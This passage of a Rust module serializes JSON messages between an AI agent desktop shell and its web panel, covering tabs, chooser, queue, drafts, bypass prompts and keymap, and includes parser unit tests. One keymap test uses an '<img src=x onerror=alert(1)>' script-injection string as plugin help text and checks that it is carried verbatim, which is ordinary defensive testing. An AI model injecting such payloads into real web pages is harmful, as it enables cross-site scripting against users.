            TabStateWire::Ended => "ended",
            TabStateWire::Failed => "failed",
        }
    }
}

/// One tab as the panel draws it (the tab bar, the chooser's open rows, the footer's mode pill).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TabView {
    pub following: bool,
    /// Live form mirrors keyed by interaction id; absent on the wire when empty.
    pub question_draft: std::collections::BTreeMap<String, Value>,
    pub id: crate::tabs::TabId,
    pub number: u16,
    pub label: String,
    pub name: Option<String>,
    pub state: TabStateWire,
    pub mode: SessionModeChoice,
    pub marker: Option<crate::tabs::Marker>,
    pub pending: usize,
    /// Whether a record of this tab's session can be resumed later (false on legacy, which writes no records).
    pub resumable: bool,
    /// Why a `failed` tab failed, shown when it is.
    pub failure: Option<String>,
    /// Whether a `failed` tab's session had been open (a tripwire, a fatal command), so the page
    /// words it "stopped" and not "did not start". `false` for every other state.
    pub failed_after_start: bool,
    /// Whether `r` on this ended tab continues its session in place (its agent stopped it with the
    /// conversation whole) rather than emptying the tab to a start screen.
    pub resumes_on_r: bool,
    /// The first prompt's title, or the resumed record's display title; `null` before one exists.
    /// Filled from `Tab.title` in `Tab::view`.
    pub title: Option<String>,
    /// The agent the tab runs, as records name it: `claude`, `codex`, `acp:<name>`.
    pub agent: String,
}

/// `{"kind":"tabs",...}`: every tab and which one is active. Sent on `ready` and whenever any of it
/// changes; always BEFORE the active tab's snapshot on a switch, so the panel knows which tab the
/// snapshot is for.
///
/// Also carries `defaultMode` (`TabSet::default_mode`): the mode a fresh tab, or a resume into a
/// new tab, takes -- the chooser derives its
/// mode line from this rather than re-deriving it, so a cycle never needs the chooser re-sent.
pub fn serialize_tabs_for_js(active: crate::tabs::TabId, tabs: &[TabView], default_mode: SessionModeChoice) -> String {
    let tabs: Vec<Value> = tabs
        .iter()
        .map(|t| {
            let mut row = json!({
                "id": t.id.0,
                "number": t.number,
                "label": t.label,
                "name": t.name,
                "state": t.state.as_str(),
                "mode": t.mode.as_str(),
                "marker": t.marker.map(crate::tabs::Marker::wire),
                "pending": t.pending,
                "resumable": t.resumable,
                "failure": t.failure,
                "failedAfterStart": t.failed_after_start,
                "resumesOnR": t.resumes_on_r,
                "title": t.title,
                "agent": t.agent,
            });
            if t.following {
                row["following"] = json!(true);
            }
            if !t.question_draft.is_empty() {
                row["questionDraft"] = json!(t.question_draft);
            }
            row
        })
        .collect();
    json!({
        "kind": "tabs",
        "active": active.0,
        "tabs": tabs,
        "defaultMode": default_mode.as_str(),
    })
    .to_string()
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DetailRow {
    pub label: String,
    pub value: String,
}

/// `prefix i`: the detail popover's rows, already worded. Opens the popover.
pub fn serialize_tab_detail_for_js(tab: crate::tabs::TabId, rows: &[DetailRow]) -> String {
    let rows: Vec<Value> = rows
        .iter()
        .map(|r| json!({ "label": r.label, "value": r.value }))
        .collect();
    json!({ "kind": "tab_detail", "tab": tab.0, "rows": rows }).to_string()
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChooserTab {
    pub tab: crate::tabs::TabId,
    pub label: String,
    pub marker: Option<crate::tabs::Marker>,
    pub pending: usize,
    pub resumable: bool,
}

impl ChooserTab {
    /// A chooser row's label: the tab's own label (`tabs::label`), and for a tab shown in an extra
    /// chat view, which one, after it. The chooser lists every tab from any page, so a row says where
    /// a pick of it will land. Set as text by the page, never as markup.
    pub fn label(number: u16, name_part: &str, view: crate::tabs::ViewId) -> String {
        let label = crate::tabs::label(number, name_part);
        if view.is_base() {
            label
        } else {
            format!("{label} · agent {}", view.number())
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ChooserRecord {
    pub provider_session_id: String,
    pub name: Option<String>,
    pub title: Option<String>,
    pub created_at: String,
    pub updated_at: String,
    /// Its lease is held by another window: shown as `open in another window`, not choosable.
    pub held_elsewhere: bool,
    /// The linked peer holds the lease, so the chooser can raise that window.
    pub held_by_partner: bool,
    pub partner_window: Option<u8>,
}

/// `prefix w`: open tabs first, then the records open in no tab, newest first. Opens the chooser.
pub fn serialize_chooser_for_js(open: &[ChooserTab], records: &[ChooserRecord]) -> String {
    let open: Vec<Value> = open
        .iter()
        .map(|t| {
            json!({
                "tab": t.tab.0, "label": t.label, "marker": t.marker.map(crate::tabs::Marker::wire),
                "pending": t.pending, "resumable": t.resumable,
            })
        })
        .collect();
    let records: Vec<Value> = records
        .iter()
        .map(|r| {
            json!({
                "providerSessionId": r.provider_session_id, "name": r.name, "title": r.title,
                "createdAt": r.created_at, "updatedAt": r.updated_at, "heldElsewhere": r.held_elsewhere,
                "heldByPartner": r.held_by_partner, "partnerWindow": r.partner_window,
            })
        })
        .collect();
    json!({ "kind": "chooser", "open": open, "records": records }).to_string()
}

/// Newer titles for records the chooser listed, read after it was sent: the page lays them over an open
/// chooser's rows in place and opens none.
pub fn serialize_chooser_titles_for_js(titles: &[(String, String)]) -> String {
    let titles: Vec<Value> = titles
        .iter()
        .map(|(id, title)| json!({ "providerSessionId": id, "title": title }))
        .collect();
    json!({ "kind": "chooser_titles", "titles": titles }).to_string()
}

/// `prefix &`: the footer's y/n prompt, first line the question (`tabs::close_prompt`).
pub fn serialize_confirm_close_for_js(tab: crate::tabs::TabId, lines: &[String]) -> String {
    json!({ "kind": "confirm_close", "tab": tab.0, "lines": lines }).to_string()
}

/// `<leader>bo`: the footer's y/n prompt for every tab but the active one,
/// naming which ones (`tabs::close_others`'s prompt, wrapped as a single line the same shape
/// `confirm_close`'s `lines` already is).
pub fn serialize_confirm_close_others_for_js(tabs: &[crate::tabs::TabId], lines: &[String]) -> String {
    let ids: Vec<u64> = tabs.iter().map(|t| t.0).collect();
    json!({ "kind": "confirm_close_others", "tabs": ids, "lines": lines }).to_string()
}

/// `prefix ,`: open the inline rename field on the tab's label, prefilled with `current`.
pub fn serialize_begin_rename_for_js(tab: crate::tabs::TabId, current: Option<&str>) -> String {
    json!({ "kind": "begin_rename", "tab": tab.0, "current": current }).to_string()
}

/// `{"kind":"editor_cards","tab":N,"cards":[...]}`: the tab's broker cards, replacing the page's whole list, sent
/// whenever the set changes, empty included.
pub fn serialize_editor_cards_for_js(
    tab: crate::tabs::TabId,
    cards: &[crate::editor_tools::cards::EditorCardWire],
) -> String {
    json!({ "kind": "editor_cards", "tab": tab.0, "cards": cards }).to_string()
}

/// A tab's queue (the `⧗` lines of held messages, and the `↪` lines of messages sent into the running turn and
/// not yet read). Only what was typed crosses: the wire text carries the editor context, which the panel
/// never shows as the user's own words. `note` says why messages are held rather than in the turn, and
/// `enter_steers` whether Enter puts a message into the running turn now (`None` with no live session: the
/// page then reads the snapshot's capability): the agent can stop being able to (a Codex that turns out not
/// to know the method), and the box's words follow it.
pub fn serialize_queue_for_js(
    tab: crate::tabs::TabId,
    items: &[crate::tab_set::Queued],
    error: Option<&str>,
    note: Option<&str>,
    enter_steers: Option<bool>,
) -> String {
    let items: Vec<Value> = items
        .iter()
        .map(|q| json!({ "text": q.text, "queuedAt": q.queued_at_ms, "steered": !q.is_held() }))
        .collect();
    json!({ "kind": "queue", "tab": tab.0, "items": items, "error": error, "note": note, "enterSteers": enter_steers })
        .to_string()
}

/// A tab's unsent draft, sent only when the panel's own copy is not the latest.
pub fn serialize_draft_for_js(tab: crate::tabs::TabId, text: &str) -> String {
    json!({ "kind": "draft", "tab": tab.0, "text": text }).to_string()
}

/// The last mirror of `tab` from the page it was just moved out of, which reached Rust after the tab's
/// new page was given the older copy. Marked `late`: the new page takes it only while its box still holds
/// that older copy, since anything typed there since is newer and goes out as its own mirror.
pub fn serialize_late_draft_for_js(tab: crate::tabs::TabId, text: &str) -> String {
    json!({ "kind": "draft", "tab": tab.0, "text": text, "late": true }).to_string()
}

/// Rust's copy of the box right after it refused the send `refused` (a request id) and the page put the
/// message back itself: the page already holds the message and what was typed after it, and this copy may
/// trail that, so the page skips it. Every other `draft` is applied.
pub fn serialize_refused_draft_for_js(tab: crate::tabs::TabId, text: &str, refused: &str) -> String {
    json!({ "kind": "draft", "tab": tab.0, "text": text, "refused": refused }).to_string()
}

/// The reply to `take_back_queue`: the whole queue, oldest first.
pub fn serialize_queue_taken_for_js(tab: crate::tabs::TabId, texts: &[String]) -> String {
    json!({ "kind": "queue_taken", "tab": tab.0, "texts": texts }).to_string()
}

/// The project's prompt history, oldest first. Window-level: every tab shares it.
pub fn serialize_history_for_js(entries: &[String]) -> String {
    json!({ "kind": "history", "entries": entries }).to_string()
}

/// Which pending cards a rule saved from a card would answer, and the rule's words.
pub fn serialize_rule_offers_for_js(
    tab: crate::tabs::TabId,
    offers: &std::collections::BTreeMap<String, agent::PrefixRule>,
) -> String {
    let offers: serde_json::Map<String, Value> = offers
        .iter()
        .map(|(id, rule)| (id.clone(), Value::String(rule.display())))
        .collect();
    json!({ "kind": "rule_offers", "tab": tab.0, "offers": offers }).to_string()
}

/// What the composer's editor-context line says: the file, relative to the project when inside it,
/// and a selection's lines.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ContextSummary {
    pub file: String,
    pub lines: Option<(u32, u32)>,
}

pub fn context_summary(
    context: Option<&crate::editor_context::EditorContext>,
    project_root: &std::path::Path,
) -> Option<ContextSummary> {
    let context = context?;
    if context.file.is_empty() {
        return None;
    }
    let path = std::path::Path::new(&context.file);
    let file = path
        .strip_prefix(project_root)
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| context.file.clone());
    Some(ContextSummary {
        file,
        lines: context.selection.as_ref().map(|s| (s.start_line, s.end_line)),
    })
}

/// The composer's editor-context line. Window-level: the editor is the window's.
pub fn serialize_editor_context_for_js(summary: Option<&ContextSummary>) -> String {
    json!({
        "kind": "editor_context",
        "file": summary.map(|s| s.file.clone()),
        "lines": summary.and_then(|s| s.lines).map(|(a, b)| json!([a, b])),
    })
    .to_string()
}

/// Where the panel stands with the editor beside it (companion mode): `state` is one of
/// `none`, `attaching`, `attached`, `detached`, `failed`, and `text` is the band's words, empty
/// when attached. Window-level, like the editor context. A window with no companion never sends it.
pub fn serialize_editor_link_for_js(state: &str, text: &str) -> String {
    json!({ "kind": "editor_link", "state": state, "text": text }).to_string()
}

/// Whether this tab's draft is out in an nvim scratch buffer.
pub fn serialize_scratch_for_js(tab: crate::tabs::TabId, editing: bool) -> String {
    json!({ "kind": "scratch", "tab": tab.0, "editing": editing }).to_string()
}

/// A one-line message for the footer's transient slot.
pub fn serialize_notice_for_js(text: &str) -> String {
    json!({ "kind": "notice", "text": text }).to_string()
}

/// `{"kind":"confirm_bypass","tab":...,"scope":...,"nonce":...,"lines":[...]}` -- the wire contract
/// the panel and Rust share. **Never emits `plan.approve`**: Rust keeps that list (and reads it
/// again when `confirm_bypass` comes back), so the panel counts nothing and echoes no
/// id back -- it only shows `lines` and answers with the tab/scope/nonce it was given.
pub fn serialize_confirm_bypass_for_js(plan: &crate::tab_set::BypassPlan) -> String {
    let (tab, scope) = match plan.scope {
        crate::tab_set::BypassScope::Tab(id) => (Value::from(id.0), "tab"),
        crate::tab_set::BypassScope::Default => (Value::Null, "default"),
    };
    json!({
        "kind": "confirm_bypass",
        "tab": tab,
        "scope": scope,
        "nonce": plan.nonce,
        "lines": plan.lines,
    })
    .to_string()
}

/// `{"kind":"confirm_restore","nonce":...,"lines":[...]}`: the question a restore asks when a saved tab
/// was in bypass. The panel shows `lines` and answers `restore_answer` with the nonce it was given;
/// which tabs are in bypass stays on this side.
pub fn serialize_confirm_restore_for_js(prompt: &crate::tab_set::RestorePrompt) -> String {
    json!({ "kind": "confirm_restore", "nonce": prompt.nonce, "lines": prompt.lines }).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn primary_copy_reads_only_its_own_kind_and_caps_the_text() {
        assert_eq!(
            primary_copy(r#"{"type":"copy_primary","text":"Run this:\n\nls -la\n\nthen look."}"#).as_deref(),
            Some("Run this:\n\nls -la\n\nthen look.")
        );
        assert_eq!(
            primary_copy(r#"{"text":"x","type":"copy_primary"}"#).as_deref(),
            Some("x")
        );
        assert_eq!(
            primary_copy(r#"{"type":"copy_primary","text":""}"#).as_deref(),
            Some("")
        );
        for other in [
            // Another kind, even one whose text names this kind.
            r#"{"type":"send_message","request_id":"r1","text":"\"copy_primary\""}"#,
            r#"{"type":"view_in_editor","request_id":"r1","title":"copy_primary","text":"x"}"#,
            // This kind with anything more, less or other than its text.
            r#"{"type":"copy_primary","text":"x","request_id":"r1"}"#,
            r#"{"type":"copy_primary","text":"x","tab":1}"#,
            r#"{"type":"copy_primary"}"#,
            r#"{"type":"copy_primary","text":7}"#,
            r#"{"type":"copy_primary","text":null}"#,
            r#"{"type":"copy_primary","text":["x"]}"#,
            r#"{"type":"Copy_Primary","text":"x"}"#,
            r#"["copy_primary","x"]"#,
            r#"{"type":"copy_primary","text":"x""#,
            "",
        ] {
            assert_eq!(primary_copy(other), None, "{other}");
        }
        let message = |text: &str| serde_json::json!({ "type": "copy_primary", "text": text }).to_string();
        let at_cap = "x".repeat(PRIMARY_COPY_MAX_BYTES);
        assert_eq!(primary_copy(&message(&at_cap)), Some(at_cap.clone()));
        assert_eq!(primary_copy(&message(&format!("{at_cap}x"))), None);
        // The cap counts UTF-8 bytes, not characters.
        let two_byte = "\u{e9}".repeat(PRIMARY_COPY_MAX_BYTES / 2);
        assert_eq!(primary_copy(&message(&two_byte)), Some(two_byte.clone()));
        assert_eq!(primary_copy(&message(&format!("{two_byte}x"))), None);
        // The longest a capped text can be spelled in JSON still reads.
        let escaped = format!(
            r#"{{"type":"copy_primary","text":"{}"}}"#,
            "\\u0001".repeat(PRIMARY_COPY_MAX_BYTES)
        );
        assert_eq!(primary_copy(&escaped).map(|t| t.len()), Some(PRIMARY_COPY_MAX_BYTES));
        // The message is the shell's alone: the panel's parser never takes it.
        assert!(parse_inbound_message(&message("x")).is_none());
    }

    #[test]
    fn first_paint_is_recognized_only_by_its_object_type() {
        for painted in [r#"{"type":"painted"}"#, r#"{"type":"painted","x":1}"#] {
            assert!(is_first_paint(painted), "{painted}");
        }
        for other in [
            r#"{"type":"ready","request_id":"r"}"#,
            r#"{"type":"copy_primary","text":"painted"}"#,
            r#""painted""#,
            r#"["painted"]"#,
            "[]",
            r#"{"type":"painted""#,
        ] {
            assert!(!is_first_paint(other), "{other}");
        }
    }

    #[test]
    fn every_message_of_the_copy_kind_is_known_as_one_so_no_host_hands_it_to_the_panel() {
        let over_cap =
            serde_json::json!({ "type": "copy_primary", "text": "x".repeat(PRIMARY_COPY_MAX_BYTES + 1) }).to_string();
        for copy in [
            r#"{"type":"copy_primary","text":"secret"}"#,
            r#"{"text":"secret","type":"copy_primary"}"#,
            r#"{"type":"copy_primary","text":"secret","request_id":"r1"}"#,
            r#"{"type":"copy_primary"}"#,
            over_cap.as_str(),
        ] {
            assert!(is_primary_copy(copy), "{copy}");
        }
        for other in [
            r#"{"type":"send_message","request_id":"r1","tab":1,"text":"\"copy_primary\""}"#,
            r#"{"type":"view_in_editor","request_id":"r1","title":"copy_primary","text":"x"}"#,
            r#"["copy_primary","x"]"#,
            r#"{"type":"copy_primary","text":"x""#,
            r#"{"type":"Copy_Primary","text":"x"}"#,
            "",
        ] {
            assert!(!is_primary_copy(other), "{other}");
        }
    }

    #[test]
    fn a_chooser_row_names_the_extra_view_that_shows_its_tab() {
        use crate::tabs::ViewId;
        assert_eq!(ChooserTab::label(3, "docs", ViewId::BASE), "3 docs");
        assert_eq!(
            ChooserTab::label(3, "docs", ViewId::new(2).unwrap()),
            "3 docs · agent 2"
        );
    }
    use crate::tabs::{Marker, TabId};
    use agent::PermissionOutcome;

    #[test]
    fn a_theme_envelope_carries_every_css_variable_verbatim() {
        let tokens = crate::theme::ThemeTokens::fallback();
        let value: serde_json::Value = serde_json::from_str(&serialize_theme_for_js(&tokens)).unwrap();
        assert_eq!(value["kind"], "theme");
        let vars = value["vars"].as_object().unwrap();
        assert_eq!(vars.len(), tokens.css_vars().len());
        assert_eq!(vars["--nv-bg"], tokens.bg.hex());
        assert_eq!(vars["--nv-font-prose"], crate::theme::tokens::PROSE_FONT_STACK);
    }

    #[test]
    fn pane_focus_is_a_kind_tagged_boolean() {
        for focused in [true, false] {
            let value: serde_json::Value = serde_json::from_str(&serialize_pane_focus_for_js(focused)).unwrap();
            assert_eq!(value, serde_json::json!({ "kind": "pane_focus", "focused": focused }));
        }
    }

    #[test]
    fn the_root_note_is_a_kind_tagged_text_that_keeps_its_characters() {
        let text = "No project boundary here (it is open to others): a \"Claude\" tab asks.\nNext";
        let value: serde_json::Value = serde_json::from_str(&serialize_root_note_for_js(text)).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "root_note", "text": text }));
        assert_eq!(
            serialize_root_note_for_js("a"),
            r#"{"kind":"root_note","text":"a"}"#,
            "the exact envelope"
        );
    }

    #[test]
    fn serializes_enter_input() {
        let value: serde_json::Value = serde_json::from_str(&serialize_enter_input_for_js()).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "enter_input" }));
    }

    #[test]
    fn serializes_focus_permission() {
        let value: serde_json::Value = serde_json::from_str(&serialize_focus_permission_for_js(TabId(1))).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "focus_permission", "tab": 1 }));
    }

    #[test]
    fn serializes_the_keymap_help() {
        let row = |k: &str, w: &str| crate::keymap::HelpRow {
            keys: k.into(),
            what: w.into(),
        };
        let (panel, _) = crate::keymap::panel::effective(&Default::default(), None);
        let value: serde_json::Value = serde_json::from_str(&serialize_keymap_for_js(
            "Ctrl+b",
            &[row("F11", "Fullscreen")],
            &[row("Ctrl+b f", "HINT")],
            &panel,
            "Ctrl+b c",
            &[row(
                "~/.tmux.conf:3",
                "bind P paste-buffer \u{2014} no Eitri equivalent: paste-buffer",
            )],
        ))
        .unwrap();
        assert_eq!(value["kind"], "keymap");
        assert_eq!(value["prefix"], "Ctrl+b");
        assert_eq!(
            value["window"],
            serde_json::json!([{ "keys": "F11", "what": "Fullscreen" }])
        );
        assert_eq!(
            value["prefixKeys"],
            serde_json::json!([{ "keys": "Ctrl+b f", "what": "HINT" }])
        );
        assert_eq!(value["newTabChord"], "Ctrl+b c");
        assert!(value["panel"]["bindings"].is_array(), "the panel table travels too");
        assert_eq!(
            value["tmuxSkipped"],
            serde_json::json!([{ "keys": "~/.tmux.conf:3", "what": "bind P paste-buffer \u{2014} no Eitri equivalent: paste-buffer" }])
        );
    }

    #[test]
    fn the_keymap_envelope_carries_the_panel_table() {
        let (panel, _) = crate::keymap::panel::effective(&Default::default(), None);
        let v: serde_json::Value =
            serde_json::from_str(&serialize_keymap_for_js("Ctrl+b", &[], &[], &panel, "Ctrl+b c", &[])).unwrap();
        assert_eq!(v["newTabChord"], "Ctrl+b c");
        assert_eq!(v["panel"]["leader"], " ");
        assert_eq!(v["panel"]["leaderSource"], "default");
        assert_eq!(v["panel"]["timeoutlen"], 1000);
        let bd = v["panel"]["bindings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|b| b["action"] == "tab.close")
            .unwrap();
        assert_eq!(bd["keys"], serde_json::json!(["<leader>", "b", "d"]));
        assert_eq!(bd["source"], "default");
        assert_eq!(
            v["panel"]["groups"][0],
            serde_json::json!({"keys": ["<leader>", "b"], "label": "+tab"})
        );
    }

    /// An unknown verb returns `None`, matching other unrecognized wire values and malformed
    /// messages in the `Option<InboundMessage>` parser.
    #[test]
    fn arrive_tab_verb_and_cycle_default_mode() {
        assert_eq!(serialize_arrive_for_js(), r#"{"kind":"arrive"}"#);
        let m = parse_inbound_message(r#"{"type":"tab_verb","request_id":"a","verb":"close"}"#).unwrap();
        assert!(matches!(
            m,
            InboundMessage::TabVerb {
                verb: TabVerbWire::Close,
                ..
            }
        ));
        assert_eq!(m.tab_ref(), TabRef::WindowLevel);
        assert!(parse_inbound_message(r#"{"type":"tab_verb","request_id":"a","verb":"rename"}"#).is_none());
        let named =
            parse_inbound_message(r#"{"type":"tab_verb","request_id":"a","verb":"new","agent":"codex"}"#).unwrap();
        assert!(matches!(
            named,
            InboundMessage::TabVerb {
                verb: TabVerbWire::New,
                agent: Some(ref agent),
                ..
            } if agent == "codex"
        ));
        let plain = parse_inbound_message(r#"{"type":"tab_verb","request_id":"a","verb":"new"}"#).unwrap();
        assert!(matches!(plain, InboundMessage::TabVerb { agent: None, .. }));
        let c = parse_inbound_message(r#"{"type":"cycle_default_mode","request_id":"a"}"#).unwrap();
        assert_eq!(c.tab_ref(), TabRef::WindowLevel);
        let m = parse_inbound_message(r#"{"type":"tab_verb","request_id":"a","verb":"close_others"}"#).unwrap();
        assert!(matches!(
            m,
            InboundMessage::TabVerb {
                verb: TabVerbWire::CloseOthers,
                ..
            }
        ));
        let co = parse_inbound_message(r#"{"type":"close_others","request_id":"a"}"#).unwrap();
        assert_eq!(co.tab_ref(), TabRef::WindowLevel);
        assert_eq!(co.request_id(), "a");
    }

    #[test]
    fn the_confirm_close_others_envelope_carries_the_ids_and_the_prompt() {
        let v: serde_json::Value = serde_json::from_str(&serialize_confirm_close_others_for_js(
            &[crate::tabs::TabId(2), crate::tabs::TabId(3)],
            &["close 2 other tabs? 1 running (y/n)".to_string()],
        ))
        .unwrap();
        assert_eq!(v["kind"], "confirm_close_others");
        assert_eq!(v["tabs"], serde_json::json!([2, 3]));
        assert_eq!(v["lines"], serde_json::json!(["close 2 other tabs? 1 running (y/n)"]));
    }

    #[test]
    fn serializes_literal_key_and_open_keymap() {
        let value: serde_json::Value = serde_json::from_str(&serialize_literal_key_for_js("C-a")).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "literal_key", "key": "C-a" }));
        let value: serde_json::Value = serde_json::from_str(&serialize_open_keymap_for_js(None, 0)).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "open_keymap", "opening": 0 }));
    }

    #[test]
    fn open_keymap_carries_the_opening() {
        let value: serde_json::Value = serde_json::from_str(&serialize_open_keymap_for_js(None, 7)).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "open_keymap", "opening": 7 }));
        let help = crate::plugin::keys::PluginKeysHelp {
            title: "Snotra".into(),
            declared: false,
            rows: Vec::new(),
        };
        let value: serde_json::Value = serde_json::from_str(&serialize_open_keymap_for_js(Some(&help), 8)).unwrap();
        assert_eq!(value["opening"], serde_json::json!(8));
        assert_eq!(value["kind"], serde_json::json!("open_keymap"));
    }

    /// `agent-ui/web/src/bridge.test.ts` pins `JSON.stringify` of the same message to these strings.
    #[test]
    fn keymap_closed_parses_with_both_return_keys_values() {
        for (json, want) in [
            (
                r#"{"type":"keymap_closed","request_id":"req-1","opening":7,"return_keys":true}"#,
                true,
            ),
            (
                r#"{"type":"keymap_closed","request_id":"req-2","opening":7,"return_keys":false}"#,
                false,
            ),
        ] {
            let msg = parse_inbound_message(json).unwrap();
            assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
            match msg {
                InboundMessage::KeymapClosed {
                    request_id,
                    opening,
                    return_keys,
                } => {
                    assert!(request_id.starts_with("req-"), "{json}");
                    assert_eq!(opening, 7, "{json}");
                    assert_eq!(return_keys, want, "{json}");
                }
                other => panic!("{json}: {other:?}"),
            }
        }
    }

    #[test]
    fn keymap_closed_without_opening_or_return_keys_is_malformed() {
        for json in [
            r#"{"type":"keymap_closed","request_id":"r","return_keys":true}"#,
            r#"{"type":"keymap_closed","request_id":"r","opening":7}"#,
            r#"{"type":"keymap_closed","opening":7,"return_keys":true}"#,
            r#"{"type":"keymap_closed","request_id":"r","opening":-1,"return_keys":true}"#,
            r#"{"type":"keymap_closed","request_id":"r","opening":7,"return_keys":null}"#,
        ] {
            assert!(parse_inbound_message(json).is_none(), "{json}");
        }
    }

    #[test]
    fn open_keymap_carries_the_plugin_pages_section() {
        let help = crate::plugin::keys::PluginKeysHelp {
            title: "Snotra".into(),
            declared: true,
            rows: vec![crate::keymap::root::HelpRow {
                keys: "]q / <C-n>".into(),
                what: "<img src=x onerror=alert(1)>".into(),
            }],
        };
        let value: serde_json::Value = serde_json::from_str(&serialize_open_keymap_for_js(Some(&help), 3)).unwrap();
        assert_eq!(
            value,
            serde_json::json!({
                "kind": "open_keymap",
                "opening": 3,
                "plugin": {
                    "title": "Snotra",
                    "declared": true,
                    "rows": [{ "keys": "]q / <C-n>", "what": "<img src=x onerror=alert(1)>" }],
                },
            })
        );
        let empty = crate::plugin::keys::PluginKeysHelp {
            title: "Snotra".into(),
            declared: false,
            rows: Vec::new(),
        };
        let value: serde_json::Value = serde_json::from_str(&serialize_open_keymap_for_js(Some(&empty), 3)).unwrap();
        assert_eq!(value["plugin"]["rows"], serde_json::json!([]));
        assert_eq!(value["plugin"]["declared"], serde_json::json!(false));
    }

    #[test]
    fn serializes_open_command_line() {
        let value: serde_json::Value = serde_json::from_str(&serialize_open_command_line_for_js()).unwrap();
        assert_eq!(value, serde_json::json!({ "kind": "open_command_line" }));
    }

    // Field order isn't pinned byte-for-byte (`serde_json`'s default map isn't insertion-ordered --
    // the same reason `serializes_focus_permission` and the `confirm_close_others` test above parse
    // rather than compare raw strings), so this checks the exact two wire spellings the Interfaces
    // block gives ("down"/"up") through a parsed `Value` rather than a literal byte string.
    #[test]
    fn serializes_editor_typing_with_its_period() {
        let v: serde_json::Value = serde_json::from_str(&serialize_editor_typing_for_js(true, 500)).unwrap();
        assert_eq!(
            v,
            serde_json::json!({ "kind": "editor_typing", "typing": true, "periodMs": 500 })
        );
        let v: serde_json::Value = serde_json::from_str(&serialize_editor_typing_for_js(false, 1000)).unwrap();
        assert_eq!(
            v,
            serde_json::json!({ "kind": "editor_typing", "typing": false, "periodMs": 1000 })
        );
    }

    #[test]
    fn serializes_nav_key_for_both_directions() {
        let v: serde_json::Value = serde_json::from_str(&serialize_nav_key_for_js(NavKeyDirection::Down)).unwrap();
        assert_eq!(v, serde_json::json!({ "kind": "nav_key", "direction": "down" }));
        let v: serde_json::Value = serde_json::from_str(&serialize_nav_key_for_js(NavKeyDirection::Up)).unwrap();
        assert_eq!(v, serde_json::json!({ "kind": "nav_key", "direction": "up" }));
    }

    /// The five page-to-Rust wire strings are pinned so `bridge.test.ts` can serialize the same
    /// messages on the page side.
    #[test]
    fn parses_the_five_panel_keys_and_nav_fallthrough_wire_strings() {
        let msg = parse_inbound_message(r#"{"type":"panel_keys","request_id":"req-7","mode":"browse"}"#).unwrap();
        assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
        assert_eq!(msg.request_id(), "req-7");
        assert!(matches!(
            msg,
            InboundMessage::PanelKeys {
                mode: PanelKeys::Browse,
                ..
            }
        ));

        let msg = parse_inbound_message(r#"{"type":"panel_keys","request_id":"req-8","mode":"input"}"#).unwrap();
        assert_eq!(msg.request_id(), "req-8");
        assert!(matches!(
            msg,
            InboundMessage::PanelKeys {
                mode: PanelKeys::Input,
                ..
            }
        ));

        let msg = parse_inbound_message(r#"{"type":"panel_keys","request_id":"req-9","mode":"other"}"#).unwrap();
        assert_eq!(msg.request_id(), "req-9");
        assert!(matches!(
            msg,
            InboundMessage::PanelKeys {
                mode: PanelKeys::Other,
                ..
            }
        ));

        let msg =
            parse_inbound_message(r#"{"type":"nav_fallthrough","request_id":"req-10","direction":"down"}"#).unwrap();
        assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
        assert_eq!(msg.request_id(), "req-10");
        assert!(matches!(
            msg,
            InboundMessage::NavFallthrough {
                direction: NavKeyDirection::Down,
                ..
            }
        ));

        let msg =
            parse_inbound_message(r#"{"type":"nav_fallthrough","request_id":"req-11","direction":"up"}"#).unwrap();
        assert_eq!(msg.request_id(), "req-11");
        assert!(matches!(
            msg,
            InboundMessage::NavFallthrough {
                direction: NavKeyDirection::Up,
                ..
            }
        ));
    }

    /// The dangerous default here is obvious and one-directional (the same reasoning as
    /// `DecisionChoice`'s own doc): an unrecognised `mode`/`direction` must be a parse failure, never
    /// silently fall back to `Other`/some direction a later `match` picked for it.
    #[test]
    fn an_unknown_panel_keys_mode_or_nav_fallthrough_direction_fails_to_parse() {
        assert!(parse_inbound_message(r#"{"type":"panel_keys","request_id":"req-7","mode":"sideways"}"#).is_none());
        assert!(
            parse_inbound_message(r#"{"type":"nav_fallthrough","request_id":"req-10","direction":"left"}"#).is_none()
        );
    }

    /// `Ctrl+w h/j/k/l` in BROWSE sends a window-level move without a tab id. All four directions
    /// carry the request id through, whichever tab the panel shows.
    #[test]
    fn parses_pane_nav_in_all_four_directions_as_a_window_level_message() {
        let msg = parse_inbound_message(r#"{"type":"pane_nav","request_id":"r","direction":"left"}"#).unwrap();
        assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
        assert_eq!(msg.request_id(), "r");
        assert!(matches!(
            msg,
            InboundMessage::PaneNav {
                direction: PaneNavDirection::Left,
                ..
            }
        ));
        // The four strings `agent-ui/web/src/bridge.test.ts` pins `JSON.stringify` to, byte for byte.
        for (json, id, want) in [
            (
                r#"{"type":"pane_nav","request_id":"req-1","direction":"left"}"#,
                "req-1",
                PaneNavDirection::Left,
            ),
            (
                r#"{"type":"pane_nav","request_id":"req-2","direction":"down"}"#,
                "req-2",
                PaneNavDirection::Down,
            ),
            (
                r#"{"type":"pane_nav","request_id":"req-3","direction":"up"}"#,
                "req-3",
                PaneNavDirection::Up,
            ),
            (
                r#"{"type":"pane_nav","request_id":"req-4","direction":"right"}"#,
                "req-4",
                PaneNavDirection::Right,
            ),
        ] {
            match parse_inbound_message(json) {
                Some(InboundMessage::PaneNav { request_id, direction }) => {
                    assert_eq!(direction, want, "{json}");
                    assert_eq!(request_id, id, "{json}");
                }
                other => panic!("{json}: {other:?}"),
            }
        }
    }

    /// Unknown directions fail parsing rather than becoming a default move in a later match.
    /// `sideways`, `Left` and `north` check unsupported words and case; missing directions or
